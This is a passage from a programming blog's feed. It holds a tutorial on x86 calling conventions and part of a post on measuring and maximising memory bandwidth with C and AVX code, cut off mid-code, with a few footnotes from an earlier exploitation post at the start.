&lt;p&gt;Note the &lt;code&gt;$'\211'&lt;/code&gt; syntax to enter escape characters.&amp;#160;&lt;a class="footnote-backref" href="#fnref-10" title="Jump back to footnote 7 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-11"&gt;
&lt;p&gt;To see why this is necessary, compare the behavior of &lt;code&gt;echo ls | bash&lt;/code&gt; to &lt;code&gt;cat &amp;lt;(echo ls) - | bash&lt;/code&gt;.&amp;#160;&lt;a class="footnote-backref" href="#fnref-11" title="Jump back to footnote 8 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</content><category term="exploitation"></category><category term="tutorial"></category></entry><entry><title>A brief introduction to x86 calling conventions</title><link href="https://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html" rel="alternate"></link><published>2013-05-21T00:00:00-07:00</published><updated>2013-05-21T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-05-21:/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html</id><summary type="html">&lt;p&gt;To support some of my other tutorials, I prepared a brief introduction to x86 calling conventions.&lt;/p&gt;</summary><content type="html">&lt;p&gt;To support some of my other tutorials, I will provide a brief introduction to x86 calling conventions. This should be considered an &lt;em&gt;introduction&lt;/em&gt;, not a thorough resource. I encourage you to check out the "Machine Prog" lectures from &lt;a href="https://www.cs.cmu.edu/afs/cs/academic/class/15213-s13/www/schedule.html"&gt;the CMU 15-213 course&lt;/a&gt; or an alternative resource. In particular, pages 11-14 of &lt;a href="https://www.cs.cmu.edu/afs/cs/academic/class/15213-s13/www/lectures/07-machine-procedures.pdf"&gt;this lecture&lt;/a&gt; are useful. &lt;a href="https://en.wikipedia.org/wiki/X86_calling_conventions"&gt;The wikipedia page&lt;/a&gt; is also a useful reference.&lt;/p&gt;
&lt;h1&gt;Calling a function&lt;/h1&gt;
&lt;p&gt;A computer program&lt;sup id="fnref-3"&gt;&lt;a class="footnote-ref" href="#fn-3"&gt;1&lt;/a&gt;&lt;/sup&gt; keeps track of two important pointers as it runs: the instruction pointer, which points to the next instruction it will execute, and the stack pointer, which points to the last value pushed onto the stack. In x86, the instruction pointer is the register &lt;code&gt;%eip&lt;/code&gt; and the stack pointer is in the register &lt;code&gt;%esp&lt;/code&gt;&lt;sup id="fnref-4"&gt;&lt;a class="footnote-ref" href="#fn-4"&gt;2&lt;/a&gt;&lt;/sup&gt;. The stack grows down (as values are pushed onto the stack, the stack pointer decreases) and is logically divided into regions, one for each function, called stack frames. &lt;/p&gt;
&lt;p&gt;When a function is called, the instruction pointer is pushed onto the stack to allow the program to return to the site of the &lt;code&gt;call&lt;/code&gt; later. Before the &lt;code&gt;call&lt;/code&gt;, the instruction pointer points to the &lt;code&gt;call&lt;/code&gt; instruction and the stack pointer points to the last thing pushed (in this case, some garbage value):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;                    code                          |          stack
--------------------------------------------------+----------------------------
%eip =&amp;gt; 0x00001f66: call   0x1ef0 &amp;lt;nop_ret&amp;gt;       |      | 0xdeadbeef | &amp;lt;= %esp
        0x00001f6b: movl   $0x0,-0x8(%ebp)        |      |            |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After the &lt;code&gt;call&lt;/code&gt;, the instruction pointer points to the first instruction in our function and the stack pointer points to the last thing pushed, the return address from our function:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;                    code                          |          stack
--------------------------------------------------+----------------------------
%eip =&amp;gt; 0x00001ef0: ret                           |      | 0xdeadbeef |
                                                  |      | 0x00001f6b | &amp;lt;= %esp
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In this case, the function does nothing and merely returns. The &lt;code&gt;ret&lt;/code&gt; instruction pops a value off the stack and into &lt;code&gt;%eip&lt;/code&gt;. This both increments the stack pointer and returns control flow to the calling function:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;                    code                          |          stack
--------------------------------------------------+----------------------------
        0x00001f66: call   0x1ef0 &amp;lt;nop_ret&amp;gt;       |      | 0xdeadbeef | &amp;lt;= %esp
%eip =&amp;gt; 0x00001f6b: movl   $0x0,-0x8(%ebp)        |      |            |
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Arguments&lt;/h1&gt;
&lt;p&gt;When a function needing arguments is called, they pushed onto the stack immediately before the call&lt;sup id="fnref-5"&gt;&lt;a class="footnote-ref" href="#fn-5"&gt;3&lt;/a&gt;&lt;/sup&gt;. If there is more than one argument, the first argument is pushed on last. The following sequence of operations corresponds to the function call &lt;code&gt;proj_1(0x5, 0x10)&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;                    code                          |          stack
--------------------------------------------------+----------------------------
%eip =&amp;gt; 0x00001f78: pushl  $0x10                  |      | 0xdeadbeef | &amp;lt;= %esp
        0x00001f7a: pushl  $0x5                   |      |            |
        0x00001f7c: call   0x1f90 &amp;lt;proj_1&amp;gt;        |      |            |
        0x00001f81: addl   $0x8, %esp             |      |            |      
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;        0x00001f78: pushl  $0x10                  |      | 0xdeadbeef |
%eip =&amp;gt; 0x00001f7a: pushl  $0x5                   |      | 0x10       | &amp;lt;= %esp
        0x00001f7c: call   0x1f90 &amp;lt;proj_1&amp;gt;        |      |            |
        0x00001f81: addl   $0x8, %esp             |      |            |      
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;        0x00001f78: pushl  $0x10                  |      | 0xdeadbeef |
        0x00001f7a: pushl  $0x5                   |      | 0x10       |
%eip =&amp;gt; 0x00001f7c: call   0x1f90 &amp;lt;proj_1&amp;gt;        |      | 0x5        | &amp;lt;= %esp
        0x00001f81: addl   $0x8, %esp             |      |            |      
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It is more common to see arguments put onto the stack via &lt;code&gt;mov&lt;/code&gt; instructions rather than via &lt;code&gt;push&lt;/code&gt; instructions. The following block of code also would call &lt;code&gt;proj_1(0x5, 0x10)&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;subl&lt;/span&gt; &lt;span class="no"&gt;$0x8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%esp&lt;/span&gt;      &lt;span class="c"&gt;# Reserve space for the arguments (4 bytes for each arg).&lt;/span&gt;
&lt;span class="nf"&gt;movl&lt;/span&gt; &lt;span class="no"&gt;$0x10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;%esp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c"&gt;# Put the first argument at the memory address %esp + 4.&lt;/span&gt;
&lt;span class="nf"&gt;movl&lt;/span&gt; &lt;span class="no"&gt;$0x5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;%esp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;    &lt;span class="c"&gt;# Put the second argument at the memory address %esp&lt;/span&gt;
&lt;span class="nf"&gt;call&lt;/span&gt; &lt;span class="no"&gt;proj_1&lt;/span&gt;
&lt;span class="nf"&gt;addl&lt;/span&gt; &lt;span class="no"&gt;$0x8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%esp&lt;/span&gt;      &lt;span class="c"&gt;# Reclaim stack space reserved for arguments.&lt;/span&gt;
&lt;span class="nf"&gt;ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Return values&lt;/h1&gt;
&lt;p&gt;As you can see, the arguments are above the return address on the stack immediately after the function call. In this case, our simple function returns merely the first argument. The &lt;code&gt;mov 0x4(%esp), %eax&lt;/code&gt; moves the value 4 above &lt;code&gt;%esp&lt;/code&gt; into &lt;code&gt;%eax&lt;/code&gt;. By convention, the return value of a function is in &lt;code&gt;%eax&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;                    code                          |          stack
--------------------------------------------------+----------------------------
%eip =&amp;gt; 0x00001f90: mov    0x4(%esp),%eax         |      | 0xdeadbeef | 
        0x00001f94: ret                           |      | 0x10       |
                                                  |      | 0x5        |
                                                  |      | 0x00001f81 | &amp;lt;= %esp
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;        0x00001f90: mov    0x4(%esp),%eax         |      | 0xdeadbeef | 
%eip =&amp;gt; 0x00001f94: ret                           |      | 0x10       |
                                                  |      | 0x5        |
                                                  |      | 0x00001f81 | &amp;lt;= %esp
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;        0x00001f78: pushl  $0x10                  |      | 0xdeadbeef |
        0x00001f7a: pushl  $0x5                   |      | 0x10       |
        0x00001f7c: call   0x1f90 &amp;lt;proj_1&amp;gt;        |      | 0x5        | &amp;lt;= %esp
%eip =&amp;gt; 0x00001f81: addl   $0x8, %esp             |      |            |      
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Immediately after the function call, the &lt;code&gt;addl $0x8, %esp&lt;/code&gt; reclaims the stack space used by pushing the arguments (in this case, 4 bytes for each of the two arguments).&lt;/p&gt;
&lt;h1&gt;Base pointer and local variables&lt;/h1&gt;
&lt;p&gt;The base pointer is conventionally used to mark the start of a function's stack frame, or the area of the stack managed by that function. Local variables are stored below the base pointer and above the stack pointer. The start of each function has a preamble saves the old base pointer and initializes a new one and the end of each function has epilogue that restores the old base pointer:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;my_function:&lt;/span&gt;
  &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nv"&gt;%ebp&lt;/span&gt;              &lt;span class="c"&gt;# Preamble: save the old %ebp.&lt;/span&gt;
  &lt;span class="nf"&gt;movl&lt;/span&gt; &lt;span class="nv"&gt;%esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%ebp&lt;/span&gt;        &lt;span class="c"&gt;# Point %ebp to the saved %ebp and the new stack frame.&lt;/span&gt;

  &lt;span class="nf"&gt;subl&lt;/span&gt; &lt;span class="no"&gt;$0x4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%esp&lt;/span&gt;        &lt;span class="c"&gt;# Reserve space for local variables.&lt;/span&gt;

  &lt;span class="nf"&gt;movl&lt;/span&gt; &lt;span class="mi"&gt;0x8&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;%ebp&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nv"&gt;%eax&lt;/span&gt;   
  &lt;span class="no"&gt;movl&lt;/span&gt; &lt;span class="nv"&gt;%eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;0x4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;%ebp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c"&gt;# Move argument into local variable.&lt;/span&gt;

  &lt;span class="c"&gt;# Function body. &lt;/span&gt;

  &lt;span class="nf"&gt;addl&lt;/span&gt; &lt;span class="no"&gt;$0x4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%esp&lt;/span&gt;        &lt;span class="c"&gt;# Reclaim space used by local variables.&lt;/span&gt;

  &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nv"&gt;%ebp&lt;/span&gt;               &lt;span class="c"&gt;# Epilogue: restore the old %ebp.&lt;/span&gt;
  &lt;span class="nf"&gt;ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Inside a function, the stack would look like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| &amp;lt;argument 2&amp;gt;       |
| &amp;lt;argument 1&amp;gt;       |
| &amp;lt;return address&amp;gt;   |
| &amp;lt;old ebp&amp;gt;          | &amp;lt;= %ebp
| &amp;lt;local var 1&amp;gt;      |
| &amp;lt;local var 2&amp;gt;      | &amp;lt;= %esp
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Saving registers&lt;/h1&gt;
&lt;p&gt;Inside a function, you can freely use &lt;code&gt;%eax&lt;/code&gt;, &lt;code&gt;%ecx&lt;/code&gt;, and &lt;code&gt;%edx&lt;/code&gt;. However, they are not guaranteed to be persistent across function calls (other functions can use them freely) so you must save them before calling other functions. If you use any other register, you &lt;em&gt;must&lt;/em&gt; make sure to save them before you use them and restore them to the original values before you return. Registers you must save before you call a function are called &lt;em&gt;caller save&lt;/em&gt; registers. Registers you must save before you can use them in a function are called &lt;em&gt;callee save&lt;/em&gt; registers. The following block of code demonstrates the proper way to save &lt;code&gt;%ebx&lt;/code&gt; (callee save) and &lt;code&gt;%ecx&lt;/code&gt; (caller save):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;my_function:&lt;/span&gt;
  &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nv"&gt;%ebp&lt;/span&gt;              &lt;span class="c"&gt;# Preamble: save the old %ebp.&lt;/span&gt;
  &lt;span class="nf"&gt;movl&lt;/span&gt; &lt;span class="nv"&gt;%esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%ebp&lt;/span&gt;
  &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nv"&gt;%ebx&lt;/span&gt;              &lt;span class="c"&gt;# Save %ebx before we use it.&lt;/span&gt;

  &lt;span class="c"&gt;# Function body.&lt;/span&gt;

  &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nv"&gt;%ecx&lt;/span&gt;              &lt;span class="c"&gt;# Save %ecx before a function call.  &lt;/span&gt;
  &lt;span class="nf"&gt;call&lt;/span&gt; &lt;span class="no"&gt;another_function&lt;/span&gt;
  &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nv"&gt;%ecx&lt;/span&gt;               &lt;span class="c"&gt;# Restore %ecx after a function call.&lt;/span&gt;

  &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nv"&gt;%ebx&lt;/span&gt;               &lt;span class="c"&gt;# Restore %ebx before we return.&lt;/span&gt;
  &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nv"&gt;%ebp&lt;/span&gt;               &lt;span class="c"&gt;# Epilogue: restore the old %ebp.&lt;/span&gt;
  &lt;span class="nf"&gt;ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;To recap:&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;%esp&lt;/code&gt; points to the last thing pushed on the stack.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%eip&lt;/code&gt; points to the next thing to execute.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;call &amp;lt;addr&amp;gt;&lt;/code&gt; pushes the current value of &lt;code&gt;%eip&lt;/code&gt; and changes &lt;code&gt;%eip&lt;/code&gt; to &lt;code&gt;&amp;lt;addr&amp;gt;&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ret&lt;/code&gt; pops the next value off the stack into &lt;code&gt;%eip&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Arguments are pushed onto the stack before a function call.&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Immediately after function call, the stack looks like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| &amp;lt;argument 2&amp;gt;     |
| &amp;lt;argument 1&amp;gt;     |
| &amp;lt;return address&amp;gt; | &amp;lt;= %esp
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Inside a function, the stack looks like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| &amp;lt;argument 2&amp;gt;       |
| &amp;lt;argument 1&amp;gt;       |
| &amp;lt;return address&amp;gt;   |
| &amp;lt;old %ebp&amp;gt;         | &amp;lt;= %ebp
| &amp;lt;local var 1&amp;gt;      |
| &amp;lt;local var 2&amp;gt;      | &amp;lt;= %esp
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The return value of a function is in &lt;code&gt;%eax&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%eax&lt;/code&gt;, &lt;code&gt;%ecx&lt;/code&gt;, and &lt;code&gt;%edx&lt;/code&gt; are caller save registers. &lt;code&gt;%ebp&lt;/code&gt;, &lt;code&gt;%ebx&lt;/code&gt;, &lt;code&gt;%edi&lt;/code&gt;, and &lt;code&gt;%esi&lt;/code&gt; are callee save registers.&lt;/li&gt;
&lt;li&gt;Please read more to learn more!&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="footnote"&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id="fn-3"&gt;
&lt;p&gt;While I hope to stay close the spirit of the truth, I'm about to lie to simplify things. Please forgive me.&amp;#160;&lt;a class="footnote-backref" href="#fnref-3" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-4"&gt;
&lt;p&gt;In x86-64, the instruction pointer and the stack pointer are in the registers &lt;code&gt;%rip&lt;/code&gt; and &lt;code&gt;%rsp&lt;/code&gt;, respectively.&amp;#160;&lt;a class="footnote-backref" href="#fnref-4" title="Jump back to footnote 2 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-5"&gt;
&lt;p&gt;In x86-64, the first 6 integer arguments are passed in the registers &lt;code&gt;%rdi&lt;/code&gt;, &lt;code&gt;%rsi&lt;/code&gt;, &lt;code&gt;%rdx&lt;/code&gt;, &lt;code&gt;%rcx&lt;/code&gt;, &lt;code&gt;%r9&lt;/code&gt;, and &lt;code&gt;%r8&lt;/code&gt;. The first 8 floating point arguments are passed in via &lt;code&gt;%xmm0&lt;/code&gt; through &lt;code&gt;%xmm7&lt;/code&gt;. Any additional arguments are pushed onto the stack.&amp;#160;&lt;a class="footnote-backref" href="#fnref-5" title="Jump back to footnote 3 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</content><category term="tutorial"></category></entry><entry><title>Achieving maximum memory bandwidth</title><link href="https://codearcana.com/posts/2013/05/18/achieving-maximum-memory-bandwidth.html" rel="alternate"></link><published>2013-05-18T00:00:00-07:00</published><updated>2013-05-18T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-05-18:/posts/2013/05/18/achieving-maximum-memory-bandwidth.html</id><summary type="html">&lt;p&gt;I embarked upon a quest to understand some unexpected behavior and write a program that achieved the theoretical maximum memory bandwidth.&lt;/p&gt;</summary><content type="html">&lt;p&gt;These past few months I was a teaching assistant for a class on &lt;a href="http://15418.courses.cs.cmu.edu/15418_spr13/"&gt;parallel computer architecture&lt;/a&gt;. One of the questions on our first homework assignment asked the students to analyze a function and realize that it could not be optimized any further because it was already at maximum memory bandwidth. But a student pointed out, rightly, that it was only at &lt;em&gt;half&lt;/em&gt; the maximum bandwidth. In an attempt to understand what was going on, I embarked on a quest to write a program that achieved the theoretical maximum memory bandwidth.&lt;/p&gt;
&lt;h2&gt;tl;dr&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Use non-temporal vector instructions or optimized string instructions to get the full bandwidth.&lt;/em&gt;&lt;/p&gt;
&lt;h1&gt;What is memory bandwidth?&lt;/h1&gt;
&lt;p&gt;When analyzing computer programs for performance, it is important to be aware of the hardware they will be running on. There are two important numbers to pay attention to with memory systems (i.e. RAM): &lt;a href="https://en.wikipedia.org/wiki/SDRAM_latency"&gt;memory latency&lt;/a&gt;, or the amount of time to satisfy an individual memory request, and &lt;a href="https://en.wikipedia.org/wiki/Memory_bandwidth"&gt;memory bandwidth&lt;/a&gt;, or the amount of data that can be accessed in a given amount of time&lt;sup id="fnref-1"&gt;&lt;a class="footnote-ref" href="#fn-1"&gt;1&lt;/a&gt;&lt;/sup&gt;. &lt;/p&gt;
&lt;p&gt;It is easy to compute the theoretically maximum memory bandwidth. &lt;a href="http://support.apple.com/kb/sp653"&gt;My laptop&lt;/a&gt; has 2 sticks of DDR3 SDRAM running at 1600 MHz, each connected to a 64 bit bus, for a maximum theoretical bandwidth of &lt;a href="http://www.wolframalpha.com/input/?i=1600+MHz+*+64+bits+*+2+to+GB%2Fs"&gt;25.6 GB/s&lt;/a&gt;&lt;sup id="fnref-4"&gt;&lt;a class="footnote-ref" href="#fn-4"&gt;2&lt;/a&gt;&lt;/sup&gt;. This means that no matter how cleverly I write my program, the maximum amount of memory I can touch in 1 second is 25.6 GB. Unfortunately, this theoretical limit is somewhat challenging to reach with real code. &lt;/p&gt;
&lt;h1&gt;Measuring memory bandwidth&lt;/h1&gt;
&lt;p&gt;To measure the memory bandwidth for a function, I wrote a simple benchmark. For each function, I access a large&lt;sup id="fnref-2"&gt;&lt;a class="footnote-ref" href="#fn-2"&gt;3&lt;/a&gt;&lt;/sup&gt; array of memory and compute the bandwidth by dividing by the run time&lt;sup id="fnref-3"&gt;&lt;a class="footnote-ref" href="#fn-3"&gt;4&lt;/a&gt;&lt;/sup&gt;. For example, if a function takes 120 milliseconds to access 1 GB of memory, I calculate the bandwidth to be &lt;a href="http://www.wolframalpha.com/input/?i=1+GB+%2F+120+milliseconds+to+GB%2Fs"&gt;8.33 GB/s&lt;/a&gt;. To try to reduce the variance and timing overhead, I repeatedly accessed our array and took the smallest time over several iterations&lt;sup id="fnref-6"&gt;&lt;a class="footnote-ref" href="#fn-6"&gt;5&lt;/a&gt;&lt;/sup&gt;. If you're curious, all my test code is available on &lt;a href="https://github.com/awreece/memory-bandwidth-demo"&gt;github&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;A first attempt&lt;/h1&gt;
&lt;p&gt;I first wrote a simple C program to just write to every value in the array.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;write_memory_loop&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;size_t&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;carray&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;size_t&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;size_t&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;carray&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This generated the assembly I was expecting:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mh"&gt;0000000100000ac0&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nf"&gt;_write_memory_loop&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;:&lt;/span&gt;
&lt;span class="x"&gt;   100000ac0:   48 c1 ee 03             shr    $0x3,%rsi&lt;/span&gt;
&lt;span class="x"&gt;   100000ac4:   48 8d 04 f7             lea    (%rdi,%rsi,8),%rax&lt;/span&gt;
&lt;span class="x"&gt;   100000ac8:   48 85 f6                test   %rsi,%rsi&lt;/span&gt;
&lt;span class="x"&gt;   100000acb:   74 13                   je     100000ae0 &amp;lt;_write_memory_loop+0x20&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt;   100000acd:   0f 1f 00                nopl   (%rax)&lt;/span&gt;
&lt;span class="x"&gt;   100000ad0:   48 c7 07 01 00 00 00    movq   $0x1,(%rdi)&lt;/span&gt;
&lt;span class="x"&gt;   100000ad7:   48 83 c7 08             add    $0x8,%rdi&lt;/span&gt;
&lt;span class="x"&gt;   100000adb:   48 39 c7                cmp    %rax,%rdi&lt;/span&gt;
&lt;span class="x"&gt;   100000ade:   75 f0                   jne    100000ad0 &amp;lt;_write_memory_loop+0x10&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt;   100000ae0:   f3 c3                   repz retq &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;But not the bandwidth I was expecting (remember, my goal is 23.8 GiB/s):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./memory_profiler
&lt;span class="go"&gt;               write_memory_loop:  9.23 GiB/s&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Using SIMD&lt;/h1&gt;
&lt;p&gt;The first thing I tried is to use &lt;a href="http://15418.courses.cs.cmu.edu/15418_spr13/index.php/lecture/basicarch/slide_021"&gt;Single Instruction Multiple Data (SIMD)&lt;/a&gt; instructions to touch more memory at once. Basically, a modern processor is very complicated and has multiple Arithmetic Logic Units (ALUs). This gives it the ability to support instructions that perform an operation on multiple pieces of data simultaneously. I will use this to perform operation on more data simultaneously to get higher bandwidth. Since my processor support AVX instructions, I can perform operations on 256 bits (32 bytes) every instruction:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;immintrin.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;write_memory_avx&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;__m256i&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;varray&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__m256i&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

